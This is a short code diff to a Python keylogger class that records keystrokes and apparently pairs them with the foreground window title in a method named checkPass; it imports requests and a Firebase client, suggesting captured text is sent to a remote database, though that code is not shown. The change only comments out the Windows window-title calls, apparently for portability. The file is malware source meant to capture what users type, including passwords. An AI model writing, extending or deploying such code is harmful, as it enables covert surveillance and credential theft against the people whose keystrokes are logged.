@@ -5,7 +5,7 @@ from datetime import datetime
 import requests
 from firebase import firebase
 import threading
-import win32gui
+# import win32gui
 import platform
 
 
@@ -28,7 +28,7 @@ class Keylogger:
         self.shift = False
     
     def checkPass(self, s):
-        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        window = ""#win32gui.GetWindowText(win32gui.GetForegroundWindow())
         toAppend = window + ":" +s 
         if len(s) != 0:
             self.all_strings.append(self.current_string)
@@ -56,7 +56,7 @@ class Keylogger:
     
     def callback(self, event):
         name = event.name
-        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        window = ""#win32guiwin32gui.GetWindowText(win32gui.GetForegroundWindow())
         if len(name) == 1:
             self.current_string += name
 
